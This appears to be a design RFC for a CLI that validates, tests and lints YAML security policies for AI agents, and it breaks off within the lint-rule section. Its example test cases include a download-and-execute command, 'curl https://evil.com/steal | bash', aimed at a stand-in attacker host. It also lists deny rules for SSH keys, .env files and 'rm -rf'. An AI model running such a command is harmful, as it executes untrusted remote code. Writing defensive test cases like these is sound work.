# RFC 03: `hushspec` Policy CLI

**Status:** Historical design record (Draft)
**Date:** 2026-03-15
**Author:** HushSpec Core Team

---

> **Delivery status:** See [the delivery ledger](STATUS.md#numbered-plan-reconciliation). `h2h` source and tests provide substantial CLI capability on the open stack; registry distribution, first-release installation, and unshown original configuration/watch scope remain separate gates.

## 1. Executive Summary

### The Problem

Policy authors today interact with HushSpec documents through raw YAML editing, with no feedback loop shorter than "deploy and see what happens." There is no way to:

- Verify that a policy file is structurally valid before committing it.
- Test that a policy produces the expected decisions for a known set of actions.
- Catch common mistakes like dead rules, overlapping patterns, or overly broad allowlists.
- Understand the effective security impact of changing a policy.

The existing `hushspec-testkit` binary is an internal conformance runner scoped to the reference implementation. It is not designed for policy authors -- it discovers fixtures by directory convention and assumes an embedded policy format. Policy authors need a tool that operates on their standalone policy files.

### What We Are Building

A single `hushspec` CLI binary with six subcommands:

| Command              | Purpose                                           | Gap Addressed |
|----------------------|---------------------------------------------------|---------------|
| `hushspec validate`  | Schema and structural validation of policy files  | Prerequisite  |
| `hushspec test`      | Run evaluation test suites against policies       | Gap #12       |
| `hushspec lint`      | Static analysis for common policy mistakes        | Gap #13       |
| `hushspec diff`      | Show effective decision changes between policies  | Gap #14       |
| `hushspec fmt`       | Canonical YAML formatting                         | DX polish     |
| `hushspec init`      | Scaffold a policy, test suite, and config file    | Onboarding    |

### Developer Experience Vision

A policy author's workflow should look like this:

```
$ hushspec init --preset ai-agent
  Created my-policy.yaml (from ai-agent preset)
  Created tests/egress.test.yaml (3 starter cases)
  Created tests/tools.test.yaml (3 starter cases)
  Created .hushspec.yaml (project config)

$ hushspec validate my-policy.yaml
  PASS  my-policy.yaml is valid (0.1.0)

$ hushspec lint my-policy.yaml
  WARN  egress: wildcard pattern "*" in allow list is overly broad  [overly-broad-pattern]
  INFO  tool_access: no require_confirmation rules defined          [no-confirmation-gate]
  2 findings (0 errors, 1 warning, 1 info)

$ hushspec test my-policy.yaml tests/
  PASS  tests/egress.test.yaml .................... 5/5
  PASS  tests/tool-access.test.yaml .............. 8/8
  FAIL  tests/secrets.test.yaml .................. 3/4
    FAIL cases[3] "deny base64-encoded key" -- expected deny, got allow
  18 cases: 17 passed, 1 failed

$ hushspec diff old-policy.yaml new-policy.yaml
  Rule Changes:
    rules.egress.allow    +2 entries, -1 entry
    rules.tool_access     block list added (3 tools)

  Decision Changes (sampled):
    egress  api.stripe.com     deny -> allow
    egress  cdn.example.com    deny -> allow
    egress  legacy.internal    allow -> deny
```

The tool provides immediate feedback, integrates into CI pipelines with machine-readable output, and makes policy changes reviewable.

---

## 2. CLI Architecture

### 2.1 Crate Structure

The CLI will be a **new crate** `crates/hushspec-cli` rather than an extension of `hushspec-testkit`. Rationale:

- `hushspec-testkit` is a conformance tool for SDK implementors. Its fixture discovery logic, category system (`ValidCore`, `InvalidCore`, `MergeBase`, etc.), and schema-first approach are specific to that use case.
- The CLI is a user-facing tool for policy authors. Its concerns are different: loading standalone policy files, resolving `extends` chains from the filesystem, running user-authored test suites, and producing actionable diagnostics.
- Keeping them separate avoids feature creep in either direction. The CLI depends on the `hushspec` library crate for parsing, validation, merge, evaluation, and resolution -- the same library the testkit uses.

Workspace layout after this work:

```
[workspace]
members = [
    "crates/hushspec",
    "crates/hushspec-testkit",
    "crates/hushspec-cli",        # NEW
]
```

The `hushspec-cli` crate produces a binary named `hushspec`.

### 2.2 Dependencies

```toml
[package]
name = "hushspec-cli"
version.workspace = true
edition.workspace = true
license.workspace = true
description = "CLI tool for validating, testing, linting, and diffing HushSpec policies"

[[bin]]
name = "hushspec"
path = "src/main.rs"

[dependencies]
hushspec = { path = "../hushspec" }
clap = { version = "4", features = ["derive"] }
clap_complete = "4"             # Shell completion generation
colored = "2"
serde = { version = "1", features = ["derive"] }
serde_yaml = "0.9"
serde_json = "1"
jsonschema = "0.18"
regex = "1"
glob = "0.3"
similar = "2"              # For diff output
tabled = "0.16"            # For table formatting
notify = "7"               # For watch mode
thiserror = "2"
anyhow = "1"
rayon = "1"                # Parallel evaluation for diff probing
```

### 2.3 Binary Name and Invocation

```
hushspec <COMMAND> [OPTIONS] [ARGS]

Commands:
  validate     Validate policy files against the HushSpec schema
  test         Run evaluation test suites against policies
  lint         Run static analysis checks on policy files
  diff         Compare two policies and show effective changes
  fmt          Format policy files canonically
  init         Scaffold a new policy project
  completions  Generate shell completions (bash, zsh, fish, powershell)

Options:
  -o, --output <FORMAT>    Output format: text, json [default: text]
  -q, --quiet              Suppress non-essential output
  -v, --verbose            Show detailed output
      --color <WHEN>       Color output: auto, always, never [default: auto]
  -h, --help               Print help
  -V, --version            Print version
```

### 2.4 Exit Codes

| Code | Meaning                                                        | Commands using it     |
|------|----------------------------------------------------------------|-----------------------|
| 0    | Success (all validations pass, all tests pass, no lint errors) | All                   |
| 1    | Failure (validation errors, test failures, lint errors)        | All                   |
| 2    | Usage error (bad arguments, missing files)                     | All                   |
| 3    | Internal error (unexpected panic, I/O failure)                 | All                   |
| 4    | Decision changes detected (diff only, with `--fail-on-change`) | `diff`               |

These codes are stable and documented. CI pipelines can rely on them.

**Command-specific exit code semantics:**

- `validate`: exits 1 if any file fails validation.
- `test`: exits 1 if any test case fails.
- `lint`: exits 1 if any finding at severity `error` is reported. Use `--fail-on-warnings` to also exit 1 on warnings.
- `diff`: exits 0 by default even when differences exist (diff is informational). Pass `--fail-on-change` to exit 4 when decision changes are detected.
- `fmt`: exits 1 if `--check` is passed and any file needs reformatting.

### 2.5 Distribution

| Channel            | Mechanism                                                      |
|--------------------|----------------------------------------------------------------|
| Cargo              | `cargo install hushspec-cli`                                   |
| Homebrew           | `brew install hushspec` (tap: `backbay-labs/tap`)              |
| npm wrapper        | `npx @hushspec/cli validate policy.yaml` (downloads binary)   |
| Pre-built binaries | GitHub Releases: `hushspec-{version}-{target}.tar.gz`          |
| Docker             | `ghcr.io/backbay-labs/hushspec:latest`                         |

The npm wrapper follows the pattern established by tools like `esbuild` and `turbo`: a thin JS package that downloads the correct platform binary on `postinstall`.

Targets for pre-built binaries:

- `x86_64-unknown-linux-gnu`
- `x86_64-unknown-linux-musl`
- `aarch64-unknown-linux-gnu`
- `x86_64-apple-darwin`
- `aarch64-apple-darwin`
- `x86_64-pc-windows-msvc`

### 2.6 Machine-Readable Output (JSON Mode)

Every subcommand supports `--output json`. JSON output uses a consistent envelope:

```json
{
  "version": "0.1.0",
  "command": "validate",
  "success": true,
  "results": [ ... ],
  "summary": {
    "total": 1,
    "passed": 1,
    "failed": 0
  }
}
```

When `--output json` is active, all human-readable chrome (colors, progress bars, status symbols) is suppressed. Diagnostics, warnings, and errors are embedded in the `results` array. The exit code still reflects success/failure for CI gating.

### 2.7 Configuration File

A `.hushspec.yaml` file at the project root can set defaults for all commands:

```yaml
# .hushspec.yaml

# Default policy file for test/lint/diff
policy: policies/production.yaml

# Test configuration
test:
  fixtures: tests/
  timeout: 30

# Lint configuration
lint:
  config: .hushspec-lint.yaml
  severity: warning
  fail_on_warnings: false

# Diff configuration
diff:
  probes: probes/production-probes.yaml
  probe_count: 20

# Formatting
fmt:
  sort_lists: true
```

**Search path:** The CLI searches for `.hushspec.yaml` starting from the current working directory, then walking up parent directories until it finds one or reaches the filesystem root. If a `.git` directory is encountered during the walk, the search stops at that directory (the project root). This matches the behavior of `.eslintrc`, `.prettierrc`, and similar tools.

When a `.hushspec.yaml` is present, commands can be run with fewer arguments:

```
# Instead of:
hushspec test policies/production.yaml tests/

# Just:
hushspec test
```

The config file is optional. Explicit command-line arguments always override config file values.

### 2.8 Shell Completions

```
$ hushspec completions bash > /etc/bash_completion.d/hushspec
$ hushspec completions zsh > ~/.zfunc/_hushspec
$ hushspec completions fish > ~/.config/fish/completions/hushspec.fish
```

Shell completions are generated by `clap_complete` and include all subcommands, flags, and argument types. File arguments complete to `.yaml`/`.yml` files.

---

## 3. `hushspec validate` Command

### 3.1 Purpose

Validate one or more HushSpec policy files for structural correctness. This is the entry point for policy authors and CI pipelines to check that a document is well-formed before any evaluation occurs.

### 3.2 Syntax

```
hushspec validate [OPTIONS] <FILE>...

Arguments:
  <FILE>...    One or more policy YAML files to validate

Options:
      --resolve          Resolve extends chains and validate the full inheritance tree
      --schema <PATH>    Path to a custom JSON Schema (overrides built-in schema)
  -o, --output <FORMAT>  Output format: text, json [default: text]
```

### 3.3 Validation Layers

Validation proceeds through four layers, stopping at the first fatal error in each layer:

**Layer 1: YAML Syntax**
Parse the file as YAML 1.2. Report line/column for syntax errors.

**Layer 2: Schema Conformance**
Validate against the built-in JSON Schema (`hushspec-core.v0.schema.json` plus extension schemas). This catches unknown fields, missing required fields, and type mismatches.

**Layer 3: Semantic Validation**
Run the `hushspec::validate()` function from the library crate. This catches:
- Unsupported `hushspec` version strings
- Duplicate secret pattern names
- Invalid regex patterns in `forbidden_patterns`, `secret_patterns.patterns`, etc.
- Numeric constraint violations (`max_imbalance_ratio <= 0`, `max_args_size == 0`)
- Posture state machine integrity (undefined states in transitions, missing `after` on timeout triggers)
- Origins cross-references (profile posture referencing undefined posture states)

**Layer 4: Extends Resolution** (when `--resolve` is passed)
Resolve the `extends` chain from the filesystem. Validate that:
- All referenced files exist and are readable.
- All referenced files are themselves valid HushSpec documents.
- No circular inheritance is present.
- The merged result is a valid document.

### 3.4 Output Format

**Text output (default):**

```
$ hushspec validate policy.yaml
  PASS  policy.yaml
    version: 0.1.0
    rules: forbidden_paths, egress, secret_patterns, tool_access
    extends: none

$ hushspec validate bad-policy.yaml
  FAIL  bad-policy.yaml
    error[E001]: unsupported hushspec version "0.3.0"
      --> bad-policy.yaml:1:11
       |
     1 | hushspec: "0.3.0"
       |           ^^^^^^^

    error[E002]: invalid regex in rules.shell_commands.forbidden_patterns[0]
      --> bad-policy.yaml:15:9
       |
    15 |       - "rm\\s+-rf\\s+[/"
       |         ^^^^^^^^^^^^^^^^
       = note: unclosed character class

  2 errors, 0 warnings
```

**Text output with `--resolve`:**

```
$ hushspec validate --resolve child-policy.yaml
  PASS  child-policy.yaml
    version: 0.1.0
    extends: ./base-policy.yaml
    resolved chain: base-policy.yaml -> child-policy.yaml
    merge strategy: deep_merge
    effective rules: forbidden_paths, egress, secret_patterns, patch_integrity, tool_access
```

**JSON output:**

```json
{
  "version": "0.1.0",
  "command": "validate",
  "success": false,
  "results": [
    {
      "file": "bad-policy.yaml",
      "valid": false,
      "errors": [
        {
          "code": "E001",
          "severity": "error",
          "message": "unsupported hushspec version \"0.3.0\"",
          "location": {
            "file": "bad-policy.yaml",
            "line": 1,
            "column": 11
          }
        },
        {
          "code": "E002",
          "severity": "error",
          "message": "invalid regex in rules.shell_commands.forbidden_patterns[0]: unclosed character class",
          "location": {
            "file": "bad-policy.yaml",
            "line": 15,
            "column": 9
          }
        }
      ],
      "warnings": []
    }
  ],
  "summary": {
    "total": 1,
    "passed": 0,
    "failed": 1
  }
}
```

### 3.5 Error Codes

All validation errors use a stable code prefix `E` followed by a three-digit number. This allows CI pipelines to filter or suppress specific errors.

| Code  | Description                                |
|-------|--------------------------------------------|
| E001  | Unsupported HushSpec version               |
| E002  | Invalid regular expression                 |
| E003  | Duplicate secret pattern name              |
| E004  | Unknown field (strict mode violation)      |
| E005  | Missing required field                     |
| E006  | Type mismatch                              |
| E007  | Invalid enum value                         |
| E008  | Numeric constraint violation               |
| E009  | Extends reference not found                |
| E010  | Circular extends chain                     |
| E011  | YAML syntax error                          |
| E012  | Posture state machine error                |
| E013  | Origins cross-reference error              |
| E014  | Detection configuration error              |

### 3.6 Batch Validation

Multiple files can be validated in a single invocation:

```
$ hushspec validate rulesets/*.yaml
  PASS  rulesets/ai-agent.yaml
  PASS  rulesets/cicd.yaml
  PASS  rulesets/default.yaml
  PASS  rulesets/permissive.yaml
  PASS  rulesets/remote-desktop.yaml
  PASS  rulesets/strict.yaml

6 files validated, 0 errors
```

The exit code is 0 only if all files pass.

---

## 4. `hushspec test` Command

### 4.1 Purpose

Run evaluation test suites against HushSpec policies. Policy authors write test cases that declare an action and its expected decision. The CLI evaluates each action against the policy using the reference evaluator and reports pass/fail.

This directly addresses **Gap #12**: "I want to write 'unit tests' for my policies: 'given this action, assert deny.'"

### 4.2 Syntax

```
hushspec test [OPTIONS] [POLICY] [TEST]...

Arguments:
  [POLICY]     Policy file to test against (optional if test files embed policies,
               or if .hushspec.yaml sets a default policy)
  [TEST]...    One or more test files or directories containing test files
               (optional if .hushspec.yaml sets a default test directory)

Options:
      --fixtures <DIR>     Discover test files recursively under DIR
      --filter <PATTERN>   Run only tests whose description matches PATTERN
      --fail-fast          Stop after the first failure
      --tap                Output in TAP (Test Anything Protocol) format
      --junit <PATH>       Write JUnit XML report to PATH
      --watch              Re-run tests when policy or test files change
      --timeout <SECS>     Per-test timeout in seconds [default: 30]
      --coverage           Show rule coverage summary after test run
  -o, --output <FORMAT>    Output format: text, json [default: text]
```

### 4.3 Test File Format

Test files reuse the existing evaluator test schema (`hushspec-evaluator-test.v0.schema.json`) with one structural change: the `policy` field becomes **optional**. This creates two usage modes:

**Mode 1: External policy (recommended for policy authors).** The test file omits `policy`. The policy is loaded from the `[POLICY]` argument on the command line (or from `.hushspec.yaml`). This is the primary workflow for policy testing -- tests are decoupled from the policy and can be reused across different policy variants.

**Mode 2: Embedded policy (for self-contained conformance tests).** The test file includes `policy`, matching the existing `hushspec-evaluator-test.v0.schema.json` format. The `[POLICY]` argument is optional; if provided, it overrides the embedded policy.

The extended schema is defined as a backward-compatible relaxation of `hushspec-evaluator-test.v0.schema.json`:

```json
{
  "$id": "https://hushspec.dev/schemas/hushspec-policy-test.v0.schema.json",
  "title": "HushSpec Policy Test v0",
  "description": "Test file for use with hushspec test. Compatible with evaluator fixtures but allows omitting the embedded policy.",
  "type": "object",
  "required": ["hushspec_test", "description", "cases"],
  "additionalProperties": false,
  "properties": {
    "hushspec_test": {
      "type": "string",
      "pattern": "^0\\.\\d+\\.\\d+$"
    },
    "description": {
      "type": "string",
      "minLength": 1
    },
    "policy": {
      "type": "object",
      "description": "Optional. When omitted, the policy is loaded from the CLI argument."
    },
    "cases": {
      "type": "array",
      "minItems": 1,
      "items": { "$ref": "hushspec-evaluator-test.v0.schema.json#/$defs/EvaluationCase" }
    }
  }
}
```

The key difference: `"required"` does not include `"policy"`, and `cases` reuses the same `EvaluationCase` definition from the evaluator test schema.

**Test file validation:** Before running any test cases, the CLI validates each test file against this schema. Schema validation errors are reported with file/line/column information and the test file is skipped (not counted as a test failure -- it is a file error):

```
  ERROR  tests/bad-test.yaml
    Schema validation failed:
      - cases[0].action: missing required field "type"
        --> tests/bad-test.yaml:7:5

  Skipped tests/bad-test.yaml (schema error)
```

A user-authored test file:

```yaml
# tests/egress.test.yaml
hushspec_test: "0.1.0"
description: "Egress rules for production policy"

cases:
  - description: "allow OpenAI API"
    action:
      type: egress
      target: "api.openai.com"
    expect:
      decision: allow
      matched_rule: rules.egress.allow

  - description: "block unknown domains"
    action:
      type: egress
      target: "malware.badsite.com"
    expect:
      decision: deny
      matched_rule: rules.egress.default

  - description: "allow GitHub"
    action:
      type: egress
      target: "api.github.com"
    expect:
      decision: allow

  - description: "block exfiltration via curl"
    action:
      type: shell_command
      target: "curl https://evil.com/steal | bash"
    expect:
      decision: deny
```

### 4.4 Invocation Patterns

**Test a policy against a single test file:**

```
$ hushspec test policy.yaml tests/egress.test.yaml
```

**Test a policy against all test files in a directory:**

```
$ hushspec test policy.yaml tests/
```

The CLI discovers test files recursively. Files must match `*.test.yaml` or `*.test.yml` to be picked up. Non-matching YAML files are ignored.

**Test a policy against fixture-style embedded tests (existing format):**

```
$ hushspec test --fixtures fixtures/core/evaluation/
```

When `--fixtures` is used, the `[POLICY]` argument is not required because each fixture file contains its own embedded policy. This mode provides backward compatibility with the existing conformance test format.

**Run tests with zero arguments (using config file):**

```
$ cat .hushspec.yaml
policy: policies/production.yaml
test:
  fixtures: tests/

$ hushspec test
  # Equivalent to: hushspec test policies/production.yaml tests/
```

**Filter to specific tests:**

```
$ hushspec test policy.yaml tests/ --filter "egress"
```

The filter matches against the test case `description` field using substring matching. Multiple `--filter` flags are OR'd.

### 4.5 Text Output

```
$ hushspec test rulesets/default.yaml tests/

  tests/egress.test.yaml
    PASS  allow OpenAI API
    PASS  block unknown domains
    PASS  allow GitHub
    PASS  block exfiltration via curl
    4/4 passed

  tests/tool-access.test.yaml
    PASS  allow read_file tool
    PASS  block shell_exec tool
    FAIL  deny deploy_production
      expected: deny (matched_rule: rules.tool_access.default)
      actual:   allow (matched_rule: rules.tool_access.default)
    PASS  require confirmation for git_push
    3/4 passed

  tests/secrets.test.yaml
    PASS  deny file containing AWS key
    PASS  deny file containing GitHub token
    PASS  allow file without secrets
    PASS  allow secret in skip_paths
    4/4 passed

  Summary: 11/12 passed, 1 failed
```

### 4.6 Failure Detail

When a test fails, the output shows exactly what diverged:

```
  FAIL  cases[2] "deny deploy_production"
    expected decision: deny
    actual decision:   allow
    expected matched_rule: rules.tool_access.default
    actual matched_rule:   rules.tool_access.default
    reason: tool matched default allow

    hint: The policy's tool_access.default is "allow". If you want to deny
          unlisted tools, set default: "block".
```

Hints are context-sensitive suggestions generated by analyzing the gap between the expected and actual results against the policy. They are suppressed in `--quiet` mode and absent in JSON output.

**Hint generation rules:**

| Expected | Actual | Hint |
|----------|--------|------|
| deny | allow (default) | "The policy's {rule}.default is 'allow'. Set default: 'block' to deny unlisted entries." |
| deny | allow (explicit) | "The target '{target}' is in the {rule}.allow list. Remove it to deny." |
| allow | deny (default) | "The policy's {rule}.default is 'block'. Add '{target}' to the allow list." |
| allow | deny (explicit) | "The target '{target}' is in the {rule}.block list. Remove it to allow." |
| warn | allow | "The target '{target}' is not in {rule}.require_confirmation. Add it to gate with confirmation." |
| warn | deny | "The target '{target}' is blocked. Move it from the block list to require_confirmation." |

### 4.7 TAP Output

TAP (Test Anything Protocol) output is supported for integration with CI systems that consume TAP:

```
$ hushspec test policy.yaml tests/ --tap
TAP version 14
1..12
ok 1 - egress.test.yaml: allow OpenAI API
ok 2 - egress.test.yaml: block unknown domains
ok 3 - egress.test.yaml: allow GitHub
ok 4 - egress.test.yaml: block exfiltration via curl
ok 5 - tool-access.test.yaml: allow read_file tool
ok 6 - tool-access.test.yaml: block shell_exec tool
not ok 7 - tool-access.test.yaml: deny deploy_production
  ---
  expected_decision: deny
  actual_decision: allow
  expected_matched_rule: rules.tool_access.default
  actual_matched_rule: rules.tool_access.default
  ...
ok 8 - tool-access.test.yaml: require confirmation for git_push
ok 9 - secrets.test.yaml: deny file containing AWS key
ok 10 - secrets.test.yaml: deny file containing GitHub token
ok 11 - secrets.test.yaml: allow file without secrets
ok 12 - secrets.test.yaml: allow secret in skip_paths
```

### 4.8 JUnit XML Output

JUnit XML output is written to a file for CI systems that consume JUnit (Jenkins, GitHub Actions summary, GitLab CI):

```
$ hushspec test policy.yaml tests/ --junit results.xml
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<testsuites name="hushspec" tests="12" failures="1" time="0.042">
  <testsuite name="tests/egress.test.yaml" tests="4" failures="0" time="0.012">
    <testcase name="allow OpenAI API" time="0.003"/>
    <testcase name="block unknown domains" time="0.003"/>
    <testcase name="allow GitHub" time="0.003"/>
    <testcase name="block exfiltration via curl" time="0.003"/>
  </testsuite>
  <testsuite name="tests/tool-access.test.yaml" tests="4" failures="1" time="0.015">
    <testcase name="allow read_file tool" time="0.003"/>
    <testcase name="block shell_exec tool" time="0.003"/>
    <testcase name="deny deploy_production" time="0.003">
      <failure message="expected deny, got allow" type="DecisionMismatch">
expected decision: deny
actual decision: allow
      </failure>
    </testcase>
    <testcase name="require confirmation for git_push" time="0.003"/>
  </testsuite>
  <testsuite name="tests/secrets.test.yaml" tests="4" failures="0" time="0.015">
    <testcase name="deny file containing AWS key" time="0.004"/>
    <testcase name="deny file containing GitHub token" time="0.003"/>
    <testcase name="allow file without secrets" time="0.004"/>
    <testcase name="allow secret in skip_paths" time="0.004"/>
  </testsuite>
</testsuites>
```

### 4.9 Watch Mode

Watch mode uses filesystem events (via the `notify` crate) to re-run tests when the policy file or any test file changes:

```
$ hushspec test policy.yaml tests/ --watch
  Watching policy.yaml, tests/ for changes...

  [14:32:05] 12 cases: 11 passed, 1 failed
  [14:32:18] policy.yaml changed, re-running...
  [14:32:18] 12 cases: 12 passed, 0 failed
```

Watch mode clears the terminal between runs and shows a timestamp. It exits on Ctrl+C. Debouncing is applied (300ms) to batch rapid filesystem events (e.g., editor save + format in sequence).

### 4.10 Rule Coverage Summary

When `--coverage` is passed, the CLI analyzes which rule blocks and sub-rules are exercised by the test cases:

```
$ hushspec test policy.yaml tests/ --coverage

  ...test results...

  Rule Coverage:
    rules.forbidden_paths.patterns      4/12 patterns exercised   33%
    rules.forbidden_paths.exceptions    1/2 patterns exercised    50%
    rules.egress.allow                  3/6 entries exercised     50%
    rules.egress.block                  0/0 entries               --
    rules.egress.default                1 case                    HIT
    rules.secret_patterns.patterns      2/4 patterns exercised    50%
    rules.tool_access.allow             0/0 entries               --
    rules.tool_access.block             2/3 entries exercised     66%
    rules.tool_access.require_confirmation  1/2 entries exercised 50%
    rules.tool_access.default           1 case                    HIT
    rules.shell_commands                NOT TESTED

  Overall: 7/9 rule blocks tested (77%)
```

Coverage is determined by examining the `matched_rule` field in evaluation results. A rule entry is "exercised" if at least one test case produces a result with a `matched_rule` path that references it.

### 4.11 Full Example: Writing a Test Suite for a Custom Policy

Suppose a policy author has written `my-policy.yaml`:

```yaml
hushspec: "0.1.0"
name: "my-team-policy"

rules:
  forbidden_paths:
    patterns:
      - "**/.env"
      - "**/.env.*"
      - "**/.ssh/**"
    exceptions:
      - "**/.env.example"

  egress:
    allow:
      - "api.github.com"
      - "*.npmjs.org"
    default: block

  tool_access:
    block:
      - shell_exec
    require_confirmation:
      - file_delete
    default: allow
```

They create a test directory `tests/` with the following files:

**`tests/paths.test.yaml`:**

```yaml
hushspec_test: "0.1.0"
description: "Path access rules"
cases:
  - description: "block .env files"
    action:
      type: file_read
      target: "/app/.env"
    expect:
      decision: deny

  - description: "allow .env.example"
    action:
      type: file_read
      target: "/app/.env.example"
    expect:
      decision: allow

  - description: "block SSH keys"
    action:
      type: file_read
      target: "/home/user/.ssh/id_rsa"
    expect:
      decision: deny

  - description: "allow normal source files"
    action:
      type: file_read
      target: "/app/src/main.rs"
    expect:
      decision: allow
```

**`tests/egress.test.yaml`:**

```yaml
hushspec_test: "0.1.0"
description: "Network egress rules"
cases:
  - description: "allow GitHub API"
    action:
      type: egress
      target: "api.github.com"
    expect:
      decision: allow

  - description: "allow npm registry"
    action:
      type: egress
      target: "registry.npmjs.org"
    expect:
      decision: allow

  - description: "block unknown domains"
    action:
      type: egress
      target: "evil.com"
    expect:
      decision: deny

  - description: "block data exfiltration"
    action:
      type: egress
      target: "attacker-controlled.com"
    expect:
      decision: deny
```

**`tests/tools.test.yaml`:**

```yaml
hushspec_test: "0.1.0"
description: "Tool access control"
cases:
  - description: "allow read_file by default"
    action:
      type: tool_call
      target: "read_file"
    expect:
      decision: allow

  - description: "block shell_exec"
    action:
      type: tool_call
      target: "shell_exec"
    expect:
      decision: deny

  - description: "require confirmation for file_delete"
    action:
      type: tool_call
      target: "file_delete"
    expect:
      decision: warn
```

Running the tests:

```
$ hushspec test my-policy.yaml tests/
  tests/paths.test.yaml ................. 4/4
  tests/egress.test.yaml ................ 4/4
  tests/tools.test.yaml ................. 3/3

  11 cases: 11 passed, 0 failed
```

### 4.12 Testing with Extends Resolution

When a policy uses `extends`, the CLI resolves the full chain before evaluating test cases:

```
$ hushspec test child-policy.yaml tests/
  Resolving extends chain: base.yaml -> child-policy.yaml
  tests/overrides.test.yaml ............. 6/6

  6 cases: 6 passed, 0 failed
```

The resolved (merged) policy is what the evaluator sees. If the extends chain cannot be resolved, the test run fails immediately with a clear error.

### 4.13 JSON Output for Test Results

```json
{
  "version": "0.1.0",
  "command": "test",
  "success": false,
  "results": [
    {
      "file": "tests/egress.test.yaml",
      "description": "Egress rules for production policy",
      "cases": [
        {
          "description": "allow OpenAI API",
          "passed": true,
          "expected": { "decision": "allow", "matched_rule": "rules.egress.allow" },
          "actual": { "decision": "allow", "matched_rule": "rules.egress.allow" }
        },
        {
          "description": "deny deploy_production",
          "passed": false,
          "expected": { "decision": "deny", "matched_rule": "rules.tool_access.default" },
          "actual": { "decision": "allow", "matched_rule": "rules.tool_access.default" },
          "hint": "The policy's tool_access.default is 'allow'. Set default: 'block' to deny unlisted entries."
        }
      ]
    }
  ],
  "summary": {
    "total_files": 3,
    "total_cases": 12,
    "passed": 11,
    "failed": 1,
    "skipped": 0
  },
  "coverage": null
}
```

When `--coverage` is passed, the `coverage` field is populated with per-rule data.

---

## 5. `hushspec lint` Command

### 5.1 Purpose

Static analysis of HushSpec policy files. Lint checks do not require an evaluation engine -- they analyze the document structure and flag common mistakes, security anti-patterns, and maintainability issues.

This directly addresses **Gap #13**: "Can the evaluator tell me if my policy has dead rules, overlapping patterns, or rules that can never fire?"

### 5.2 Syntax

```
hushspec lint [OPTIONS] <FILE>...

Arguments:
  <FILE>...    One or more policy YAML files to lint

Options:
      --config <PATH>        Path to lint configuration file [default: .hushspec-lint.yaml]
      --fix                  Apply auto-fixes where safe
      --rule <RULE>          Run only the specified lint rule(s) (can repeat)
      --severity <LEVEL>     Minimum severity to report: error, warning, info [default: info]
      --fail-on-warnings     Exit 1 if any warnings are reported (not just errors)
      --watch                Re-run lint when files change
  -o, --output <FORMAT>      Output format: text, json [default: text]
```

### 5.3 Lint Rules

Each lint rule has a stable identifier (kebab-case), a default severity, and a description.

#### L001: `dead-rule-block`

**Severity:** warning
**Description:** A rule block is defined but `enabled` is `false`. The entire block is inert and could be confusing to readers.

**Example:**
```yaml
rules:
  egress:
    enabled: false     # <-- this entire block is dead
    allow:
      - "api.openai.com"
    default: block
```

**Diagnostic:**
```
  WARN  rules.egress: rule block is disabled (enabled: false)  [dead-rule-block]
    --> policy.yaml:4:5
     |
   4 |     enabled: false
     |     ^^^^^^^^^^^^^
    = help: remove the block or set enabled: true
```

**Auto-fix:** None (requires human judgment).

---

#### L002: `overlapping-patterns`

**Severity:** warning
**Description:** Two glob patterns in the same list can match the same path. This is not necessarily wrong but may indicate unintended overlap.

**Example:**
```yaml
rules:
  forbidden_paths:
    patterns:
      - "**/.env"
      - "**/.env.*"    # overlaps: .env.local matches both if .env matches dotfiles
```

**Detection algorithm:** For each pair of patterns in the same array, the lint generates a set of synthetic test paths and checks whether both patterns match any of them. Synthetic paths are derived by extracting literal segments from each pattern and combining them. For example, given `"**/.env"` and `"**/.env.*"`, the lint generates paths like `/app/.env`, `/app/.env.local`, `/app/.env.production` and checks for dual matches.

**Diagnostic:**
```
  WARN  rules.forbidden_paths.patterns: patterns[0] "**/.env" and
        patterns[1] "**/.env.*" may overlap  [overlapping-patterns]
    --> policy.yaml:5:9
    = note: both patterns can match paths like "/app/.env.local"
```

**Auto-fix:** None (overlap may be intentional).

---

#### L003: `shadowed-exception`

**Severity:** warning
**Description:** An exception pattern in `forbidden_paths.exceptions` does not match any pattern in `forbidden_paths.patterns`, making it a no-op.

**Example:**
```yaml
rules:
  forbidden_paths:
    patterns:
      - "**/.ssh/**"
    exceptions:
      - "**/.aws/config"   # <-- no pattern blocks .aws paths
```

**Detection algorithm:** For each exception pattern, the lint checks whether any path that matches the exception could also be matched by at least one `patterns` entry. This is done by generating synthetic paths from the exception pattern's literal segments and testing them against all forbidden patterns. If no forbidden pattern matches any generated path, the exception is flagged as dead.

**Diagnostic:**
```
  WARN  rules.forbidden_paths.exceptions[0] "**/.aws/config" does not match
        any forbidden pattern -- exception has no effect  [shadowed-exception]
    --> policy.yaml:7:9
```

**Auto-fix:** `--fix` removes the dead exception entry.

---

#### L004: `overly-broad-pattern`

**Severity:** warning
**Description:** A pattern in an allowlist is so broad that it effectively disables the rule. Common triggers:
- `"*"` in `egress.allow`
- `"**"` or `"**/*"` in `path_allowlist.read`
- A single `"*"` in `tool_access.allow`

**Example:**
```yaml
rules:
  egress:
    allow:
      - "*"            # <-- allows all egress, making the block list the only control
    default: block
```

**Diagnostic:**
```
  WARN  rules.egress.allow[0]: wildcard pattern "*" allows all domains,
        effectively disabling egress control  [overly-broad-pattern]
    --> policy.yaml:5:9
    = help: enumerate specific allowed domains instead of using "*"
```

**Auto-fix:** None (requires human judgment).

---

#### L005: `empty-blocklist-with-default-allow`

**Severity:** info
**Description:** A rule block has `default: allow` and an empty `block` list, meaning nothing is blocked. This is valid but worth noting.

**Example:**
```yaml
rules:
  egress:
    allow: []
    block: []
    default: allow
```

**Diagnostic:**
```
  INFO  rules.egress: default is "allow" with empty block list -- all egress
        is permitted  [empty-blocklist-with-default-allow]
```

---

#### L006: `no-confirmation-gate`

**Severity:** info
**Description:** The `tool_access` rule has no `require_confirmation` entries. All tools are either immediately allowed or denied with no human-in-the-loop checkpoint.

**Diagnostic:**
```
  INFO  rules.tool_access: no require_confirmation rules defined -- consider
        gating sensitive tools like file_write, deploy  [no-confirmation-gate]
```

---

#### L007: `regex-complexity`

**Severity:** warning
**Description:** A regex pattern has characteristics that suggest potential ReDoS (Regular Expression Denial of Service) risk:
- Nested quantifiers (e.g., `(a+)+`)
- Overlapping alternations with quantifiers
- Exponential backtracking potential

**Example:**
```yaml
rules:
  shell_commands:
    forbidden_patterns:
      - "(.*a)+"       # <-- nested quantifier, ReDoS risk
```

**Detection algorithm:** The lint uses heuristic pattern matching on the regex source string to detect:

1. **Nested quantifiers:** patterns matching `\([^)]*[+*][^)]*\)[+*]` (a quantified group containing a quantified element).
2. **Star-dot-star chains:** patterns matching `\.\*.*\.\*` within a quantified group.
